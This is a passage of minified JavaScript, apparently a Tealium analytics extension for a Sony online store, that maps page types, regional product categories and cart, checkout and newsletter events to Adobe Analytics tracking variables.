d},function(e,t){try{"cart_add"==t.event_name&&(t.tealium_event="cart_add")}catch(e){utag.DB(e)}try{"cart_empty"==t.event_name&&(t.tealium_event="cart_empty")}catch(e){utag.DB(e)}try{"cart_remove"==t.event_name&&(t.tealium_event="cart_remove")}catch(e){utag.DB(e)}try{"cart"==t.page_type&&(t.tealium_event="cart_view")}catch(e){utag.DB(e)}try{"category"==t.page_type&&(t.tealium_event="category_view")}catch(e){utag.DB(e)}try{"checkout"==t.page_type&&(t.tealium_event="checkout")}catch(e){utag.DB(e)}try{"email_signup"==t.event_name&&(t.tealium_event="email_signup")}catch(e){utag.DB(e)}try{"generic"==t.page_type&&(t.tealium_event="page_view")}catch(e){utag.DB(e)}try{"product"==t.page_type&&(t.tealium_event="product_view")}catch(e){utag.DB(e)}try{"confirmation"==t.page_type&&(t.tealium_event="purchase")}catch(e){utag.DB(e)}try{"search"==t.page_type&&(t.tealium_event="search")}catch(e){utag.DB(e)}try{"social_share"==t.event_name&&(t.tealium_event="social_share")}catch(e){utag.DB(e)}try{"user_login"==t.event_name&&(t.tealium_event="user_login")}catch(e){utag.DB(e)}try{"user_logout"==t.event_name&&(t.tealium_event="user_logout")}catch(e){utag.DB(e)}try{"user_register"==t.event_name&&(t.tealium_event="user_register")}catch(e){utag.DB(e)}},function(e,t){try{utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[27]&&(utag.runonce.ext[27]=1,"regional:ecommerce"==t.website_platform&&(_bsq.aa.regionalRUStoreAdobeVariables=function(e,t,a){var o={},i={},r={};o.audio="audio",o.photo_video="cameras",o.sony_xperia="mobile-tablets",o.playstation="play-station",o.tv_video="tv-home-cinema",o.video="video-cameras",i["video-actioncam"]="action-cam",i["video-video"]="handycam",i["video-video_acc"]="accessories",i["video-profcamcorder"]="pro-camcoders",i["video-accy_for_profcamcorder"]="accessories",i["audio-music_center"]="audio-systems",i["audio-home_cinema"]="home-cinema-audio",i["audio-radio"]="boomboxes-radios-portable-cd-players",i["audio-hifi"]="high-res-audio",i["audio-headphones"]="headphones",i["audio-home_cinema"]="home-cinema-audio",i["audio-av"]="incar-receivers-players",i["audio-mic"]="microphones",i["audio-dictophone"]="voice-recorders",i["audio-mp3player"]="walkman-digital-music-players",i["audio-wireless_speakers"]="wireless-speakers-speaker-docks",i["audio-vynil"]="audio-systems",i["audio-memcard"]="memory-cards-flash-drives-hdd",i["photo_video-alpha"]="alpha-digital-cameras",i["photo_video-alpha_accy"]="accessories",i["photo_video-compact"]="cyber-shot",i["photo_video-compact_acc"]="accessories",i["photo_video-optics"]="lenses",i["photo_video-print"]="accessories",i["tv_video-dvd_player"]="bd-dvd-players",i["tv_video-bd_player"]="bd-dvd-players",i["tv_video-portable_players"]="bd-dvd-players",i["tv_video-headmount_display"]="head-mounted-display",i["tv_video-home_cinema"]="home-cinema",i["tv_video-projector"]="projectors",i["tv_video-tv"]="tvs",i["tv_video-accessories"]="accessories",i["tv_video-soundbar"]="home-cinema",i["sony_xperia-memcard"]="memory-cards-flash-drives-hdd",i["photo_video-memcard"]="memory-cards-flash-drives-hdd",i["video-memcard"]="memory-cards-flash-drives-hdd",i["sony_xperia-smartphones"]="smartphones-xperia",i["sony_xperia-tablet"]="tablets-xperia",i["sony_xperia-smartwear"]="smartwear",i["sony_xperia-acc_smartphones"]="accessories",i.playstation="playstation",i["playstation-playstation_4"]="playstation",i["playstation-playstation_4_pro"]="playstation",i["playstation-playstation_3"]="playstation",i["playstation-playstation_vr"]="playstation",i["playstation-games"]="games",i["playstation-playstation_vita"]="playstation",i["playstation-playstation_accy"]="accessories",r["tv_video-tv-x"]="televisions",r["photo_video-alpha-e_mount"]="cameras-digital-cameras",r["photo_video-alpha-a_mount"]="cameras-digital-cameras",r["photo_video-compact-W-series"]="cameras-cyber-shot",r["photo_video-compact-H-series"]="cameras-cyber-shot",r["photo_video-compact-T-series"]="cameras-cyber-shot",r["photo_video-compact-R-series"]="cameras-cyber-shot",r["photo_video-compact-QX-series"]="cameras-cyber-shot",r["audio-headphones-headphones_outer"]="headband",r["video-video-Cameras"]="camcorders",r["photo_video-optics-e_mount"]="camera-lenses",r["photo_video-optics-a_mount"]="camera-lenses",r["video-actioncam-Action_Cam"]="action-cam-video-cameras",r["audio-music_center-minisystems"]="all-in-one-hi-fi-systems-audio-systems",r["audio-mp3player-walkman_video"]="walkman-walkman-digital-music-players",r["audio-mp3player-walkman"]="walkman-walkman-digital-music-players",r["audio-wireless_speakers-wireless_speakers"]="wireless-speakers",r["audio-vynil-vynil"]="audio-components-audio-systems",r["audio-home_cinema-dvd_ht"]="sound-bars",r["audio-av-recievers"]="receivers-players",r["audio-headphones-headphones_inner"]="in-ear",r["audio-home_cinema-bluray_ht"]="all-in-one-systems",r["tv_video-home_cinema-DVD_ht"]="all-in-one-systems",r["tv_video-bd_player-players_blu_ray"]="blu-ray-disc-players",r["tv_video-accessories-pultdis"]="tvs-remotes-selectors-cameras",r["tv_video-headmount_display-hmz"]="3D-viewer",r["audio-dictophone-voice_recorders"]="voice-recorders-audio",r["tv_video-projector-home"]="projectors-tv-home-cinema",r["audio-hifi-recievers"]="av-receivers",r["photo_video-compact_acc-Bags"]="cyber-shot-cases-covers-straps",r["audio-radio-compact_radio"]="radios",r["audio-radio-boombox"]="boomboxes",r["tv_video-accessories-3d"]="tvs-3D-glasses",r["photo_video-optics-Teleconverters"]="converters-mount-adapters",r["tv_video-dvd_player-dvd_players"]="dvd-players",r["photo_video-alpha_accy-straps"]="a-digital-cameras-cases-covers-straps",r["photo_video-alpha_accy-bags"]="a-digital-cameras-cases-covers-straps",r["audio-radio-radio_clock"]="clock-radios",r["photo_video-alpha_accy-batteries_chargers"]="a-digital-cameras-batteries-chargers",r["sony_xperia-tablet-xperia_tablet_z2"]="xperia-tablet-z",r["tv_video-accessories-brackets"]="tvs-tv-stands",r["video-video_acc-tripods"]="handycam-tripods-remotes",r["photo_video-alpha_accy-lamps"]="a-digital-cameras-flashes-lights",r["photo_video-compact_acc-batteries"]="cyber-shot-batteries-chargers",r["video-video_acc-batteries"]="handycam-batteries-chargers",r["photo_video-alpha_accy-batteries_chargers"]="handycam-batteries-chargers",r["sony_xperia-smartwear-smartwear"]="smart-watch-mobile-tablets",r["sony_xperia-smartwear-smartwear"]="smart-watch-mobile-tablets",r["audio-av-amp"]="amplifiers-car-marine",r["photo_video-alpha_accy-Tripods"]="a-digital-cameras-tripods-remotes",r["photo_video-alpha_accy-Remote_controls"]="a-digital-cameras-tripods-remotes",r["audio-av-speakers"]="speakers-car-marine",r["photo_video-alpha_accy-microphones"]="a-digital-cameras-microphones",r["photo_video-alpha_accy-screen_protectors"]="a-digital-cameras-other-accessories",r["video-video_acc-microphones"]="handycam-microphones-speakers",r["photo_video-memcard-HDD"]="external-hard-drives",r["audio-hifi-speakers"]="speakers-audio-systems",r["tv_video-accessories-hdmi"]="video-cables",r["photo_video-compact_acc-Other"]="cyber-shot-other-accessories",r["photo_video-compact_acc-kits"]="cyber-shot-accessory-kits",r["photo_video-optics-Filters"]="camera-lenses-filters",r["photo_video-memcard-mstick"]="memory-stick",r["video-video_acc-cases_bags"]="handycam-cases-covers-straps",r["photo_video-memcard-flash"]="usb-flash-drives",r["photo_video-alpha_accy-grips"]="a-digital-cameras-vertical-grips",r["sony_xperia-acc_tablet-cover"]="xperia-tablets-accessories",r["sony_xperia-acc_tablet-acc_tablet"]="xperia-tablets-accessories",r["sony_xperia-acc_tablet-charger"]="xperia-tablets-accessories",r["sony_xperia-acc_tablet-accy"]="xperia-tablets-accessories",r["sony_xperia-acc_tablet-microsd"]="xperia-tablets-accessories",r["photo_video-memcard-xqd"]="xqd-memory-cards",r["sony_xperia-acc_smartphones-microsd"]="micro-sd-cards",r["photo_video-optics-Lens_caps"]="camera-lenses-caps",r["photo_video-compact_acc-lens_adaptors"]="cyber-shot-viewfinders-monitors",r["photo_video-alpha_accy-kits"]="a-digital-cameras-accessory-kits",r["video-video_acc-cables"]="handycam-other-accessories",r["video-video_acc-filters"]="handycam-other-accessories",r["video-video_acc-Others"]="handycam-other-accessories",r["video-video_acc-flashes"]="handycam-flashes-lights",r["photo_video-alpha_accy-viewfinders"]="a-digital-cameras-viewfinders-monitors",r["audio-mp3player-walkman_acc"]="walkman-digital-music-players-accessories",r["photo_video-memcard-sd"]="sd-cards",r["tv_video-projector-vpl_accy"]="head-mounted-display-tv-home-cinema",r["tv_video-accessories-hdmi"]="tvs-cables",r["video-actioncam-Action_Cam_accy"]="action-cam-accessories",r["photo_video-alpha_accy-lens_hoods"]="camera-lenses-hoods",r["photo_video-optics-Lens_caps"]="lens_style_cameras_accessories",r["photo_video-memcard-minidv"]="tape-media",r["audio-av-amp"]="amplifiers-audio-systems",r["sony_xperia-acc_smartphones-chargers"]="xperia-smartphones-portable-chargers",r["tv_video-portable_players-portable_player"]="dvd-players",r["playstation-playstation_4-accessories_playstation_4"]="playstation-accessories",r["playstation-playstation_4_pro-console_playstation_4_pro"]="playstation-4-pro",r["playstation-playstation_4-console_playstation_4"]="playstation-4",r["playstation-playstation_vr-playstation_vr"]="playstation-vr",r["playstation-games-PS4_games"]="PS4-games",r["playstation-games-VR_games"]="VR-games",r["playstation-games-cards"]="cards",r["playstation-playstation_vita-accessories_ps_vita"]="accessories";var n=function(e,t){return void 0!==e[t]?e[t]:t};if(void 0!==a&&void 0!==a.page&&void 0!==a.page.pageTemplate&&void 0!==a.page.name)if(/^sso:(product_detail|checkout:shipping-payment|checkout:thank you|error|users:registration|products_comparison)$/g.test(a.page.pageTemplate))if(/^sso:users:registration$/g.test(a.page.pageTemplate))""!==_bsq.utils.getQueryParameter(document.URL,"reghash4")?t.aaPageName="sso:users:registration_complete":t.aaPageName=a.page.name||"";else if(/^sso:product_detail$/g.test(a.page.pageTemplate)){s="",d="",c="";t.aaProductCategoryStructure=(void 0!==a.product&&(s=n(o,a.product.category1)||"",d=n(i,a.product.category2)||"",c=n(r,a.product.category3)||""),""!==s&&""!==d&&""!==c?s+":"+d+":"+c:""!==s&&""!==d&&""===c?s+":"+d:""!==s&&""===d&&""===c?s:void 0),t.aaProductCategory1=s,t.aaProductCategory2=d,t.aaProductCategory3=c,t.aaProductCategoryStructure&&t.aaProductCategoryStructure.indexOf(":")>-1&&(t.aaProductCategoryStructure=t.aaProductCategoryStructure.replace(/:/g,">")),t.aaProductCategory3?t.aaProductCategoryTree='D=c34+">"+c35+">"+c36':t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),t.aaProductPrice=a.product.price||"",t.aaProducts=void 0!==a.product?a.product.sku||"":[],t.aaProductSKU=void 0!==a.product&&a.product.sku.join(",")||"",t.aaPageName=(a.page.section||"sso")+":product_details:"+t.aaProductSKU}else/^sso:error$/g.test(a.page.pageTemplate)?/\/users\/registration\//i.test(window.location.pathname)?t.aaPageName=(a.page.section||"sso")+":registration:error":(t.aaPageType="errorPage",t.aaPageName=a.page.name||"",t.aaEvents.push("event6")):/^sso:checkout:shipping-payment$/g.test(a.page.pageTemplate)?(t.aaPageName=a.page.name||"sso:",t.aaProducts=function(){return void 0!==a.order&&void 0!==a.order.sku?a.order.sku:[]}.call(this),t.aaEvents.push("scCheckout")):/^sso:checkout:thank you$/g.test(a.page.pageTemplate)?(t.aaPageName=a.page.name||"sso:",t.aaProducts=void 0!==a.order&&void 0!==a.order.sku?a.order.sku:[],t.aaProductsQuantity=void 0!==a.order&&void 0!==a.order.quantity?a.order.quantity:[],t.aaProductsPrice=void 0!==a.order&&void 0!==a.order.price?a.order.price:[],t.aaEvents.push("purchase"),t.aaPurchaseID=void 0!==a.order&&void 0!==a.order.id?a.order.id:"",t.aaPaymentType=a.order.paymentType||""):/^sso:products_comparison$/g.test(a.page.pageTemplate)&&(t.aaPageName=a.page.name||"sso:",t.aaProducts=void 0!==a.product?[a.product.sku||""]:[]);else{var s="",d="",c="";t.aaPageName=a.page.name||"sso:",t.aaProductCategoryStructure=(void 0!==a.product&&(s=n(o,a.product.category1)||"",d=n(i,a.product.category2)||"",c=n(r,a.product.category3)||""),""!==s&&""!==d&&""!==c?s+":"+d+":"+c:""!==s&&""!==d&&""===c?s+":"+d:""!==s&&""===d&&""===c?s:void 0),t.aaProductCategory1=s,t.aaProductCategory2=d,t.aaProductCategory3=c,t.aaProductCategoryStructure&&t.aaProductCategoryStructure.indexOf(":")>-1&&(t.aaProductCategoryStructure=t.aaProductCategoryStructure.replace(/:/g,">")),t.aaProductCategory3?t.aaProductCategoryTree='D=c34+">"+c35+">"+c36':t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34")}else t.aaPageName="sso:";return"undefined"!=typeof jQuery&&(jQuery(document).on("cart_addition",(function(e){var a=[];jQuery("div.cart-popup-block div.cart-item").each((function(e){a.push(jQuery(this).data("sku")||"")})),0===a.length&&void 0!==e.sku_id?t.aaEvents.push("scOpen","scAdd"):a.length>0&&void 0!==e.sku_id&&t.aaEvents.push("scAdd"),t.aaProducts=void 0!==e.sku_id?[e.sku_id]:[],t.aaProductsQuantity=void 0!==e.quantity?[e.quantity]:[],t.aaProductSKU=void 0!==e.sku_id?e.sku_id:[],t.aaLinkTrackEvents=t.aaEvents.join(","),t.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop1,prop2,prop7,prop9,prop25,prop20,eVar27,eVar20,eVar21,eVar22,eVar1,eVar2,eVar7,eVar46,eVar19",t.aaLinkType="o",t.aaLinkName="Add to Cart",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),jQuery(document).on("cart_show",(function(e){void 0!==e.sku_id&&(t.aaProducts=void 0!==e.sku_id?e.sku_id:[],t.aaProductsQuantity=void 0!==e.quantity?e.quantity:[],t.aaEvents.push("scView"),t.aaLinkTrackEvents="scView",t.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop1,prop2,prop7,prop9,prop25,prop20,eVar27,eVar20,eVar21,eVar22,eVar1,eVar2,eVar7,eVar46,eVar19",t.aaLinkType="o",t.aaLinkName="View Cart",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))})),jQuery(document).on("cart_removal",(function(e){t.aaProducts=void 0!==e.sku_id?[e.sku_id]:[],t.aaProductsQuantity=void 0!==e.quantity?[e.quantity]:[],t.aaProductSKU=void 0!==e.sku_id?e.sku_id:[],t.aaEvents.push("scRemove"),t.aaLinkTrackEvents="scRemove",t.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop1,prop2,prop7,prop9,prop25,prop20,eVar27,eVar20,eVar21,eVar22,eVar1,eVar2,eVar7,eVar46,eVar19",t.aaLinkType="o",t.aaLinkName="Remove from Cart",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))),t},_bsq.aa.regionalHKStoreAdobeVariables=function(e,t,a){return/checkout:cart/gi.test(a.page.pageTemplate)?(t.aaProducts=a.cart.sku,t.aaProductsQuantity=a.cart.quantity,t.aaProductsCategory=a.cart.category,a.cart.quantity.length>0&&t.aaEvents.push("scAdd"),""===_bsq.utils.docCookies.getItem("s_newCart")&&(t.aaEvents.push("scOpen"),_bsq.utils.docCookies.setItem("s_newCart","1")),t.aaEvents.push("scView")):/checkout:checkout/gi.test(a.page.pageTemplate)?(t.aaProducts=a.order.sku,t.aaProductsQuantity=a.order.quantity,t.aaProductsCategory=a.order.category,t.aaProductsPrice=function(){var e=[];for(i in a.order.price)e.push(a.order.price[i]+a.order.tax[i]);return e}.call(this),t.aaEvents.push("scCheckout")):/checkout:thank you/gi.test(a.page.pageTemplate)&&(t.aaProducts=a.order.sku,t.aaProductsQuantity=a.order.quantity,t.aaProductsCategory=a.order.category,t.aaProductsPrice=function(){var e=[];for(i in a.order.price)e.push(a.order.price[i]+a.order.tax[i]);return e}.call(this),t.aaEvents.push("purchase"),t.aaPurchaseID=void 0!==a.order&&void 0!==a.order.id?a.order.id:"",t.aaPaymentType=a.order.paymentType||""),t},_bsq.aa.regionalCSAStoreAdobeVariables=function(e,t,a){var o=function(e){var t="";if(null!=e){var a={televisores:"tvs",auriculares:"headphones","cmaras a con lentes intercambiables":"alpha-digital-cameras","cyber-shot":"cyber-shot",lentes:"lenses",accesorios:"accessories","action cam":"action-cam","handycam":"handycam","reproductores de blu-rey disctm y dvd":"bd-dvd-players","teatro en casa":"home-cinema","audfonos":"headphones","boomboxes, radios y reproductores de cd porttiles":"boomboxes-radios-portable-cd-players","grabadoras de voz digital":"voice-recorders",minicomponentes:"audio-systems","parlantes inalmbricos":"wireless-speakers-speaker-docks","reproductores de msica digital walkman":"walkman-digital-music-players",consolas:"playstation",juegos:"games","smartphones xperia":"xperia smartphone",smartwear:"smartwear","tables xperia":"xperia-tablets","bocinas y amplificadores":"speakers-amplifiers","bocinas-y-amplificadores":"speakers-amplifiers","receptor con soporte para smartphone":"marine-audio","receptor-con-soporte-para-smartphone":"marine-audio","reproductores para automvil":"incar-receivers-players",especial:"special-collection","reproductores de blu-ray disc y dvd":"bd-dvd-players","tablets xperia":"xperia-tablets",subwoofers:"speakers-amplifiers",amplificadores:"speakers-amplifiers",parlantes:"speakers-amplifiers","reproductores de blu-ray disc y dvd":"bd-dvd-players","radios y reproductores de cd porttiles":"boomboxes-radios-portable-cd-players","video y pantallas para el auto":"receivers-players","parlantes y amplificadores":"speakers-amplifiers",camaras:"cameras",videocamaras:"video-cameras","televisores y home theatre":"tv-home-cinema",audio:"audio",playstation:"play-station",storage:"energy-storage-cables","special-collection":"special-collection","cmaras":"cameras","videocmaras":"video-cameras","televisores y teatros en casa":"tv-home-cinema","playstation":"play-station","celulares y tablets":"mobile-tablets","audio para auto":"car-marine","televisores y teatro en casa":"tv-home-cinema","tablets y accesorios":"mobile-tablets","tablets-y-accesorios":"mobile-tablets","accesorios para playstation":"accessories","accesorios-para-playstation":"accessories","cmaras con lentes intercambiables":"alpha-digital-cameras","radios porttiles":"radios","radios-portatiles":"boomboxes-radios-portable-cd-players","sistemas de audio":"audio-systems","sistemas-de-audio":"audio-systems","home theatre":"home-cinema","accesorios para playstation":"accessories","tv y home theatre":"tv-home-cinema","tv-y-home-theatre":"tv-home-cinema","teatros en casa":"home-cinema","teatros-en-casa":"home-cinema","autoestereo con soporte para smartphone":"marine-audio","autoestereo-con-soporte-para-smartphone":"marine-audio","bocinas inalmbricas":"wireless-speakers-speaker-docks","bocinas-inalambricas":"wireless-speakers-speaker-docks",bocinas:"speakers-amplifiers",audifonos:"headphones","grabadoras-de-voz-digital":"voice-recorders","radios-y-reproductores-de-cd-portatiles":"boomboxes-radios-portable-cd-players","boomboxes,-radios-y-reproductores-de-cd-portatiles":"boomboxes-radios-portable-cd-players","reproductores-de-musica-digital-walkman":"walkman-digital-music-players","parlantes-inalambricos":"wireless-speakers-speaker-docks","televisores-y-teatros-en-casa":"tv-home-cinema","televisores-y-teatro-en-casa":"tv-home-cinema","teatro-en-casa":"home-cinema","reproductores-de-blu-ray-disc-y-dvd":"bd-dvd-players","camaras-a-con-lentes-intercambiables":"alpha-digital-cameras","camaras-con-lentes-intercambiables":"alpha-digital-cameras","celulares-y-tablets":"mobile-tablets","reproductores-para-automovil":"incar-receivers-players","audio-para-auto":"car-marine","video-y-pantallas-para-el-auto":"incar-receivers-players","parlantes-y-amplificadores":"speakers-amplifiers","smartphones-xperia-liberados":"smartphones-xperia","home-theatre":"home-cinema","energia-y-almacenamiento":"energy-storage-cables","cargadores-portatiles":"portable-chargers",celulares:"mobile-tablets","receivers-players":"incar-receivers-players",proyectores:"projectors","tarjetas-de-memoria,-unidades-flash-y-hdd":"memory-cards-flash-drives-hdd",baterias:"battery-products",_inativas:"mobile-tablets","productos-inteligentes":"smartwear"};t=void 0!==a[e]?a[e.toLowerCase()]:e}return t},i=o(a.product.category1)||"",r=o(a.product.category2)||"";if(t.aaProductCategoryStructure=""!==i&&""!==r?i+">"+r:""!==i?i:"",t.aaProductCategory1=i,t.aaProductCategory2=r,""!==t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':""!==t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),t.aaPageName=a.page.section+":"+a.page.name,/^home$/gi.test(a.page.pageTemplate))t.aaPageTemplate="homeview";else if(/^category$/gi.test(a.page.pageTemplate))t.aaPageName=a.page.section+":category1:"+i,t.aaPageTemplate="departmentview";else if(/^gallery$/gi.test(a.page.pageTemplate))t.aaPageName=a.page.section+":category2:"+i,t.aaPageTemplate="categoryview";else if(/^(product|product_details)$/gi.test(a.page.pageTemplate)){var n=new RegExp(/[",<>';]/gi);t.aaProductPrice=a.product.price||"";var s=Object.keys(a.product.stockStatus||{});t.aaProducts=void 0!==a.product&&s||[],t.aaProductSKU=void 0!==a.product&&s.join(",")||"",t.aaProductSKUPredefined=void 0!==a.product&&a.product.model[0]||"",void 0!==s&&s.length>0&&(""===t.aaProductSKUPredefined||"-"===t.aaProductSKUPredefined)&&(t.aaProductSKUPredefined=s[0]),t.aaProductSKUPredefined=t.aaProductSKUPredefined.replace(n,""),t.aaInventoryStatus=function(){var e=0,t="",o=a.product.stockStatus;for(var i in o)o.hasOwnProperty(i)&&0===e&&(t=0===(t=o[i])?3:t>0&&t<5?2:1),e++;return t}(),-1===document.URL.indexOf("lid=")?t.aaPageName=a.page.section+":product:"+i+":"+r+":"+t.aaProductSKUPredefined:t.aaPageName=a.page.section+":product-light:"+i+":"+r+":"+t.aaProductSKUPredefined,t.aaPageTemplate="productview",t.aaEvents.push("event32")}else/^(static|collection|landing)$/gi.test(a.page.pageTemplate)&&!/^order placed/gi.test(a.page.name)?t.aaPageName=a.page.section+":"+a.page.name:/^error$/gi.test(a.page.pageTemplate)?(t.aaPageName=a.page.section+":"+a.page.name,t.aaEvents.push("event6"),t.aaPageType="errorPage"):/^search$/gi.test(a.page.pageTemplate)?t.aaPageName=a.page.section+":search:"+a.search.term:/^(cart|email|profile|shipping|payment)$/gi.test(a.page.pageTemplate)?t.aaPageName=a.page.section+":"+a.page.pageTemplate:/^thank you$/gi.test(a.page.pageTemplate)||/^order placed/gi.test(a.page.name)?(t.aaPageName=a.page.section+":orderPlaced",t.aaPageTemplate="orderplaced"):t.aaPageName="sso:"+_bsq.utils.all_maskPIIData(document.URL);return/(cart|payment)/gi.test(a.page.pageTemplate)&&(t.aaProducts=a.cart.sku,t.aaProductsQuantity=a.cart.quantity,t.aaProductsCategory=a.cart.category,a.cart.quantity.length>0&&/^cart$/gi.test(a.page.pageTemplate)&&(t.aaEvents.push("scAdd"),t.aaEvents.push("scView")),/^payment$/gi.test(a.page.pageTemplate)&&t.aaEvents.push("scCheckout"),""===_bsq.utils.docCookies.getItem("s_newCart")&&(t.aaEvents.push("scOpen"),_bsq.utils.docCookies.setItem("s_newCart","1"))),(/^thank you$/gi.test(a.page.pageTemplate)||/^order placed/gi.test(a.page.name))&&(t.aaProducts=void 0!==a.order&&void 0!==a.order.sku?a.order.sku:[],t.aaProductsQuantity=void 0!==a.order&&void 0!==a.order.quantity?a.order.quantity:[],t.aaProductsPrice=void 0!==a.order&&void 0!==a.order.price?a.order.price:[],t.aaEvents.push("purchase"),t.aaPurchaseID=void 0!==a.order&&void 0!==a.order.id?a.order.id:"",t.aaPaymentType=a.order.paymentType||"",t.aaShippingMethod=a.order.shippingMethod||""),"undefined"!=typeof jQuery&&(jQuery("body").on("newletterFormComplete",(function(){t.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",t.aaLinkTrackEvents="event19",t.aaEvents.push("event19"),t.aaInteractionType="SOLA newsletter popup | Module interraction - Form completed",t.aaLinkType="o",t.aaLinkName="Module interaction - SOLA newsletter popup",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),jQuery(document).ajaxComplete((function(e,o,i){/\/no-cache\/AviseMe.aspx/i.test(i.url)&&"true"==o.responseText&&/^(product|product_details)$/gi.test(a.page.pageTemplate)&&(t.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,prop33,prop34,prop35,eVar27,eVar20,eVar21,eVar22,eVar1,eVar2,eVar7,eVar55,eVar46,eVar45,eVar5",t.aaLinkTrackEvents="event100",t.aaEvents.push("event100"),t.aaLinkType="o",t.aaLinkName="SOLA Out Of Stock - Interest Form Submitted",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))})),window.addEventListener("load",(function(e){if(jQuery("#ol-newsletter.overlay.active").length>0)try{t.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",t.aaLinkTrackEvents="event19",t.aaEvents.push("event19"),t.aaInteractionType="SOLA newsletter popup | Module interraction - Form appeared",t.aaLinkType="o",t.aaLinkName="Module interaction - SOLA newsletter popup",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}catch(e){}})),jQuery("body").on("warranty_purchase",(function(e){t.aaLinkTrackVars="products,pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar43",t.aaLinkTrackEvents="event63",t.aaEvents.push("event63"),t.aaProductsMerhcandise=[e.sku.toLowerCase()||""],t.aaLinkType="o",t.aaLinkName="Extended Warranty Added",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))),window.mSCClickThroughEVar72=function(e,t){if(null!=(i=window.sgwn.account)&&""!==i){var a=s_gi(window.sgwn.account),o=sgwn.pageName+":"+t;a.linkTrackVars="eVar150",a.linkTrackEvents="None",a.eVar150=o,a.tl(e,"o",o)}var i},t},_bsq.aa.regionalCAStoreAdobeVariables=function(e,t,a){if(t.aaProductCategory1=a.product.category1,t.aaProductCategory2=a.product.category2,t.aaProductCategoryStructure=""!==t.aaProductCategory1&&""!==t.aaProductCategory2?t.aaProductCategory1+">"+t.aaProductCategory2:""!==t.aaProductCategory1?t.aaProductCategory1:"",""!==t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':""!==t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),/^product_details$/gi.test(a.page.pageTemplate)&&(t.aaPageName=t.aaSiteSection+":pdp:"+t.aaProductCategory1+":"+t.aaProductCategory2+":"+a.product.sku[0],t.aaProductPrice=a.product.price||"",t.aaProducts=a.product.sku,t.aaProductSKU=a.product.sku[0],t.aaProductSKUPredefined=void 0!==a.product&&a.product.sku[0]||"",t.aaEvents.push("event32")),/(cart|payment)/gi.test(a.page.pageTemplate)&&(t.aaProducts=a.cart.sku,t.aaProductsQuantity=a.cart.quantity,a.cart.quantity.length>0&&/^cart$/gi.test(a.page.pageTemplate)&&t.aaEvents.push("scView"),/^payment$/gi.test(a.page.pageTemplate)&&t.aaEvents.push("scCheckout"),""===_bsq.utils.docCookies.getItem("s_newCart")&&(t.aaEvents.push("scOpen"),_bsq.utils.docCookies.setItem("s_newCart","1"))),/thank_you$/gi.test(a.page.name)&&/thank_you$/gi.test(document.URL)){var o=function(e){return"number"==typeof e?Number(e.toFixed(2)):"string"==typeof e?Number(Number(e).toFixed(2)):e};t.aaProducts=void 0!==a.order&&void 0!==a.order.sku?a.order.sku:[],t.aaProductsQuantity=void 0!==a.order&&void 0!==a.order.quantity?a.order.quantity:[],t.aaProductsPrice=void 0!==a.order&&void 0!==a.order.price?a.order.price:[],t.aaProductsPrice=function(){var e=[];if(void 0!==a.order&&void 0!==a.order.quantity&&void 0!==a.order.price)for(i in a.order.price)e.push(o(a.order.price[i])+o(a.order.tax[i])/a.order.quantity[i]);return e}.call(this),t.aaPurchaseID=a.order.id||"",t.aaPaymentType=a.order.paymentType||"",t.aaShippingMethod=a.order.shippingMethod||"",t.aaEvents.push("purchase")}return document.addEventListener("addToCart",(function(e){var a=e.detail,o=parseInt(jQuery("span.site-header-cart--count").attr("data-header-cart-count"))||0;t.aaEvents=[],0===o&&void 0!==a.sku?t.aaEvents.push("scOpen","scAdd"):o>0&&void 0!==a.sku&&t.aaEvents.push("scAdd"),t.aaProducts=a.sku||[],t.aaProductsQuantity=a.quantity||[],t.aaProductSKU=a.sku||[],t.aaLinkTrackEvents=t.aaEvents.join(","),t.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop1,prop2,prop7,prop9,prop25,prop20,eVar27,eVar20,eVar21,eVar22,eVar1,eVar2,eVar7,eVar46,eVar19",t.aaLinkType="o",t.aaLinkName="Add to Cart",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),t},_bsq.aa.regionalANZStoreAdobeVariables=function(e,t,a){return t.aaRegionalV150=a.user.customerGroup,t.aaProductCategory1=a.product.category1,t.aaProductCategory2=a.product.category2,t.aaProductCategory3=a.product.category3,t.aaProductCategoryStructure=""!==t.aaProductCategory1&&""!==t.aaProductCategory2&&""!==t.aaProductCategory3?t.aaProductCategory1+">"+t.aaProductCategory2+">"+t.aaProductCategory3:""!==t.aaProductCategory1&&""!==t.aaProductCategory2?t.aaProductCategory1+">"+t.aaProductCategory2:""!==t.aaProductCategory1?t.aaProductCategory1:"",""!==t.aaProductCategory3?t.aaProductCategoryTree='D=c34+">"+c35+">"+c36':""!==t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':""!==t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),/category|gallery/gi.test(a.page.pageTemplate)&&(t.aaNumberOfProducts=a.gallery.productsCount,t.aaFilters=function(){var e=a.page.filters,t="";for(var o in e)for(var i in e[o])t+=o+"="+e[o][i]+";";return 